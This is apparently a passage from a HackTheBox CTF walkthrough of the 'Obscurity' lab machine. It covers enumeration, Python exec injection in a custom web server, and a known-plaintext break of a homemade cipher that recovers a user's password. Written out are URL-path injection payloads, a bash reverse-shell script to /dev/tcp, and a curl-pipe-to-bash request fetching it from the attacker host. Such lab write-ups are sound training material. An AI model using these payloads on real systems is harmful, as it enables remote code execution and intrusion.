---
title: HTB: Obscurity
url: https://0xdf.gitlab.io/2020/05/09/htb-obscurity.html
date: 2020-05-09T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-obscurity, ctf, hackthebox, nmap, python, gobuster, dirsearch, wfuzz, python-injection, command-injection, code-analysis, crypto, credentials, race-condition, injection, lxd, lxc, arbitrary-write, python-path, htb-mischief
---

![Obscurity](https://0xdfimages.gitlab.io/img/obscurity-cover.jpg)

Obscuirt was a medium box that centered on finding bugs in Python implementations of things - a webserver, an encryption scheme, and an SSH client. I’ll start by locating the source for the custom Python webserver, and injecting into it to get code execution and a shell. I’ll pivot to the next user abusing a poor custom cipher to decrypt a password. To get root, I’ll show four different ways. Two involve an SSH-like script that I can abuse both via a race condition to leak the system hashes and via injection to run a command as root instead of the authed user. The other two were patches after the box was released, but I’ll show them, exploiting the Python path, and exploiting the lxd group.

## Box Info

| Name | [Obscurity](https://hackthebox.com/machines/obscurity)  [Obscurity](https://hackthebox.com/machines/obscurity) [Play on HackTheBox](https://hackthebox.com/machines/obscurity) |
| --- | --- |
| Release Date | [30 Nov 2019](https://twitter.com/hackthebox_eu/status/1199992939390353409) |
| Retire Date | 09 May 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Obscurity |
| Radar Graph | Radar chart for Obscurity |
| First Blood User | 00:24:12[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 00:36:36[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [clubby789 clubby789](https://app.hackthebox.com/users/83743) |

## Recon

### nmap

`nmap` shows two ports open, SSH (22) and HTTP (8080):

```

root@kali# nmap -p- --min-rate 10000  10.10.10.168
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-30 14:05 EST
Nmap scan report for 10.10.10.168
Host is up (0.035s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
8080/tcp open   http-proxy
9000/tcp closed cslistener

Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
root@kali# nmap -p 22,80,8080,9000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.168
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-30 14:05 EST
Nmap scan report for 10.10.10.168
Host is up (0.025s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 30 Nov 2019 19:06:18
|     Server: BadHTTPServer
|     Last-Modified: Sat, 30 Nov 2019 19:06:18
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.70%I=7%D=11/30%Time=5DE2BD9D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2030\x20Nov\x202
SF:019\x2019:06:18\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sat,\x2030
SF:\x20Nov\x202019\x2019:06:18\nContent-Length:\x204171\nContent-Type:\x20
SF:text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\
SF:"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>
SF:\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
SF:scale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20n
SF:ame=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Temp
SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20s
SF:tylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/bo
SF:otstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-
SF:awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templ
SF:atemo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-targe
SF:t=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n
SF:<div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinne
SF:r-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x2
SF:0Sat,\x2030\x20Nov\x202019\x2019:06:18\nServer:\x20BadHTTPServer\nLast-
SF:Modified:\x20Sat,\x2030\x20Nov\x202019\x2019:06:18\nContent-Length:\x20
SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x2
SF:0html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\
SF:t<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20c
SF:ontent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20cont
SF:ent=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\n
SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
SF:ofile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styles
SF:heet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\
SF:"scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x2
SF:0section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"
SF:sk-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds

```

It’s also showing TCP 80 and 9000 as closed, which means they are sending reset packets instead of just no reply like the other ports. It’ll be interesting to see if I can get them to talk from some other perspective.

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), this looks like Ubuntu Bionic (18.04). The HTTP server looks non-standard. I’ll dig on that.

### Website - TCP 8080

#### Site

The page doesn’t say much about what the page is for, other than to give information on the webserver:

[![Web page](https://0xdfimages.gitlab.io/img/image-20191130153239351.png)](https://0xdfimages.gitlab.io/img/image-20191130153239351.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20191130153239351.png)

The text talks about how the site uses custom servers.

There’s also the note to the devs:

> The current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory.

I took a quick look at the page source, but there wasn’t much interesting. The only paths were `/css` and `/js`, and nothing there jumped out as unusual.

#### Server Enumeration

Poking at the webserver confirms it is a custom server. There’s a response header for `BadHTTPServer`:

```

HTTP/1.1 200 OK
Date: Sun, 01 Dec 2019 13:26:59
Server: BadHTTPServer
Last-Modified: Sun, 01 Dec 2019 13:26:59
Content-Length: 4171
Content-Type: text/html
Connection: Closed

```

Additionally, things break when I try to run `gobuster`:

```

root@kali# gobuster dir -u http://10.10.10.168:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================                                     
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                     
===============================================================                                     
[+] Url:            http://10.10.10.168:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt                     
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================                                     
2019/12/02 16:09:49 Starting gobuster
===============================================================                                     
2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=<nil>
2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=<nil>
2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=<nil>
2019/12/02 16:09:49 Unsolicited response received on idle HTTP channel starting with "\n"; err=<nil>
...[snip]...

```

`dirsearch.py` works fine, but it doesn’t find anything other than `/`, which is weird, because I already noted the `css` and `js` directories:

```

root@kali# dirsearch.py -u http://10.10.10.168:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions:  | Threads: 10 | Wordlist size: 87646

Error Log: /opt/dirsearch/logs/errors-19-12-02_16-13-04.log

Target: http://10.10.10.168:8080

[16:13:04] Starting: 
[16:13:04] 200 -    4KB - /

Task Completed

```

I can see this clearly with `curl`. Even though the dir exists, going to it directly returns a 404. Typically this would be a 403 Forbidden, or a dir list:

```

root@kali# curl -I 10.10.10.168:8080/js
HTTP/1.1 404 NOT FOUND
Date: Sat, 30 Nov 2019 20:40:51
Server: BadHTTPServer
Last-Modified: Sat, 30 Nov 2019 20:40:51
Content-Length: 150
Content-Type: text/html
Connection: Closed

root@kali# curl -I 10.10.10.168:8080/js/custom.js
HTTP/1.1 200 OK
Date: Sat, 30 Nov 2019 20:42:57
Server: BadHTTPServer
Last-Modified: Sat, 30 Nov 2019 20:42:57
Content-Length: 414
Content-Type: application/javascript
Connection: Closed

```

#### Find Source

Given I know the name of the file I’m looking for, that it’s in a “secret development directory”, and I can’t count on standard tools to identify the directory name, I’ll use `wfuzz`, targeting the url `http://10.10.10.168:8080/FUZZ/SuperSecureServer.py`. Every time I run this, it dies around 2000 tests:

```

root@kali# wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py --hl 6 --hw 367
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 87664

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                  
===================================================================

000002045:   404        6 L      14 W     172 Ch      "297"
Fatal exception: Pycurl error 52: Empty reply from server

```

It seems there’s some kind of weird response from the server that’s breaking things. Since the page said it was in the development directory, I did a grep on `dev` to make a smaller wordlist 125 lines long:

```

root@kali# grep dev /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt > dev_dirs
root@kali# wc -l dev_dirs
125 dev_dirs

```

Rerunning `wfuzz` with this list finds something:

```

root@kali# wfuzz -c -w dev_dirs -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py --hl 6 --hw 367
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 125

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                  
===================================================================

000000009:   200        170 L    498 W    5892 Ch     "develop"                                                                                                                                                

Total time: 0.451881
Processed Requests: 125
Filtered Requests: 124
Requests/sec.: 276.6211

```

#### Server Source

Having found the directory, I can get the server source from that url, `http://10.10.10.168:8080/develop/SuperSecureServer.py`.

It turns out that because the server doesn’t handle directory traversal safely, I could also get it from `http://10.10.10.168:8080/../SuperSecureServer.py`. I can use `curl` with the `--path-as-is` flag to allow for `../`. I’m not sure how I would have found that without a shell to see that there are two copies of `SuperSecureServer.py`, or just a wild guess that it might exist in `../`.

## Shell as www-data

### Code Analysis

Now I have the full server code:

```

import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}

class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}

class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the received data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"

        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}

```

In a quick scan over the code, the first thing that jumped out to me was the `exec` (with a comment that also highlights it):

```

def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
        cwd = os.path.dirname(os.path.realpath(__file__))

```

No, that is not how you do string formatting. Passing user input (`path`) into `exec` is always dangerous. I’ll trace back through the code to see if I can control `path` when it gets into `serveDoc`.

`serveDoc` is called from `handleRequest`:

```

def handleRequest(self, request, conn, address):
    if request.good:
        document = self.serveDoc(request.doc, DOC_ROOT)
        statusNum=document["status"]
    else:
        document = self.serveDoc("/errors/400.html", DOC_ROOT)
        statusNum="400"
    body = document["body"]

```

It’s important that `request.good` is true, or else I lose control over `path` as it’s hardcoded to `"/errors/400.html"`.

`handleRequest` is called from `listenToClient`:

```

def listenToClient(self, client, address):
    size = 1024
    while True:
        try:
            data = client.recv(size)
            if data:
                # Set the response to echo back the received data 
                req = Request(data.decode())
                self.handleRequest(req, client, address)
                client.shutdown()
                client.close()
            else:
                raise error('Client disconnected')
        except:
            client.close()
            return False

```

This is an infinite loop that recveives data, processes is into a `Request` object, and calls `handleRequest`. Tracing backwards, I need that `Request` object to have `.good` be true, and `.doc` be my code.

The `Request` class converts data into the object in `__init__`:

```

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}

```

It seems as long as the data has a normal format with a url, version, headers, and body (can be empty), it will return `self.good = True`. Further, the `doc` is just what’s in the url string. I should be able to control that.

### Injection

#### In Terminal

I’ll start with local testing that resembles what’s going on on Obscurity to see what I need to send as a payload to get execution.

```

root@kali# python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> info = "output = 'Document: {}'"
>>> path = "/index.html"
>>> exec(info.format(path))
>>> output
'Document: /index.html'

```

I can see my input is added to the `info` string, and then that string is executed. The intended behavior is to save a string with the file name in the variable `output`. But what if I use the input to inject commands. If I request `/index.html'; os.system('echo test');'`, then `test` is printed:

```

>>> path = "/index.html'; os.system('echo test');'"
>>> exec(info.format(path))
test

```

That’s because first the `format` happens, resulting in a string:

```

>>> info.format(path)
"output = 'Document: /index.html'; os.system('echo test');''"

```

Now when `exec` is called on that string, it saves `output`, but also makes the `os.system` call.

In many Python injections, I’d have to worry getting a reference to the `os` module, but since it’s already imported into this script, I don’t have to worry about that. If I wanted to run processes using `subprocess` instead of `os`, I’d need to do that.

#### POC

Now to prove this on Obscurity, I’ll try to write a payload to test this exploit. Since I don’t think I’ll see the results of the run, I’ll try to `ping` myself. I’ll use a payload of:

```

/';os.system('ping%20-c%201%2010.10.14.19');'

```

I’ll start `tcpdump` to listen for ICMP. Then I’ll visit the page root through Burp, and then find that request and send it to Repeater. There I’ll modify the request to:

```

GET /';os.system('ping%20-c%201%2010.10.14.19');' HTTP/1.1
Host: 10.10.10.168:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

When the web server splits on space (before the `%20`s are decoded to spaces), it should get my injection into the `path` variable. When I send this, I get a ping:

```

root@kali# tcpdump -n -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
08:27:13.007310 IP 10.10.10.168 > 10.10.14.19: ICMP echo request, id 20509, seq 1, length 64
08:27:13.007361 IP 10.10.14.19 > 10.10.10.168: ICMP echo reply, id 20509, seq 1, length 64

```

I’ve got code execution.

### Shell

The make things simple and limit spaces, I’ll create a file in my current folder called `shell`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.19/443 0>&1

```

Now I’ll use Python to server this, and have my injection just use `curl` to get it and pipe it into `bash`. In Repeater:

```

GET /';os.system('curl%2010.10.14.19/shell|bash');' HTTP/1.1
Host: 10.10.10.168:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

When I send that, I see a hit on the Python webserver:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.168 - - [01/Dec/2019 09:13:15] "GET /shell HTTP/1.1" 200 -

```

And then a shell on the `nc` listener as www-data:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.168.
Ncat: Connection from 10.10.10.168:37652.
www-data@obscure:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Priv: www-data –> robert

### Enumeration

With a shell on the box, one of the places I always check out is `/home`. In this case, there’s one user:

```

www-data@obscure:/home$ ls
robert

```

In robert’s homedir, I find `user.txt`, but I can’t read it. There’s a few other files:

```

www-data@obscure:/home/robert$ ls -l 
total 24
drwx------ 2 robert robert 4096 Oct  5 13:09 BetterSSH
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt

```

While `BetterSSH` is certainly interesting (and almost certainly exploitable), I can’t access it as www-data, so I’ll move on for now.

The rest of the files are related. When I run `SuperSecureCrypt.py` with `-h`, I get the options:

```

www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]

Encrypt with 0bscura's encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode

```

With the three `.txt` files, two are UFT-8, and one is ASCII:

```

www-data@obscure:/home/robert$ file *.txt
check.txt:            ASCII text, with CRLF line terminators
out.txt:              UTF-8 Unicode text, with NEL line terminators
passwordreminder.txt: UTF-8 Unicode text, with no line terminators
user.txt:             regular file, no read permission

```

`check.txt` is readable:

```

www-data@obscure:/home/robert$ cat check.txt 
Encrypting this file with your key should result in out.txt, make sure your key is correct! 

```

`out.txt` and `passwordreminder.txt` are not:

```

www-data@obscure:/home/robert$ cat out.txt 
¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
www-data@obscure:/home/robert$ cat passwordreminder.txt 
´ÑÈÌÉàÙÁÑé¯·¿k

```

I can also check out the source for `SuperSecureCrypt.py`:

```

import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)

```

### Get Key

#### Details

Given that I have both the plaintext and the ciphertext for `check.txt`, I can look at the code above for known plaintext attacks. In this case, I’ll see that “encryption” is just looping over the plaintext and the key and adding them together mod 255, and writing the output. That means that for each byte, if I subtract the plaintext byte from the ciphertext byte, I’ll get the key byte.

I’ll just open a Python terminal on Obscurity and read the files, being careful of formatting (the ciphertext is written out as UTF-8, so I’ll read it in that way).

```

www-data@obscure:/home/robert$ python3
Python 3.6.8 (default, Aug 20 2019, 17:12:48)
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('check.txt', 'r', encoding='UTF-8') as f:
...     plain = f.read()
...
>>> plain
'Encrypting this file with your key should result in out.txt, make sure your key is correct! \n'
>>> with open('out.txt', 'r', encoding='UTF-8') as f:
...    cipher = f.read()
...
>>> len(cipher)
93
>>> len(plain)
93

```

The fact that they are the same length is a good sanity check. Now I’ll use a list comprehension to loop over the bytes, subtracting them:

```

>>> ''.join([chr(ord(c)-ord(p)) for c,p in zip(cipher,plain)])
'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal'

```

To break that down:
- `zip` takes two arrays and creates an array of pairs so you can work with them at the same time. For example:

  ```

  >>> zip('abc', 'def')
  [('a', 'd'), ('b', 'e'), ('c', 'f')]

  ```
- So `[chr(ord(c)-ord(p)) for c,p in zip(cipher,plain)]` will take each pair of `c` and `p`, and return an array with each item being `chr(ord(c)-ord(p))`. That’s just converting each byte into an int, subtracting, and then converting the result back to a character.
- `''.join()` just takes an array, and joins each element with, in this case, the empty string.

I’ll see that the key is “alexandrovich”.

#### Shortcut

I looked at the code to see that I could get the key by subtracting the plaintext from the cipher text. I did that in Python, but `SuperSecureCrypt.py` does that too. So I can get the key by calling it in decrypt mode with the ciphertext and the plaintext as the key:

```

www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -d -o /dev/shm/key.txt
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /dev/shm/key.txt...
www-data@obscure:/home/robert$ cat /dev/shm/key.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich

```

### Get Password

With the key, I can just run the program to get the plaintext of `passwordreminder.txt`:

```

www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -d -k alexandrovich -o /dev/shm/.df
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /dev/shm/.df...
www-data@obscure:/home/robert$ cat /dev/shm/.df
SecThruObsFTW
www-data@obscure:/home/robert$ rm /dev/shm/.df 

```

I could also just do the “decryption” in the same Python terminal:

```

>>> key = ''.join([chr(ord(c)-ord(p)) for c,p in zip(cipher,plain)])
>>> with open('passwordreminder.txt', 'r', encoding='UTF-8') as f:
...     cipher2 = f.read()
... 
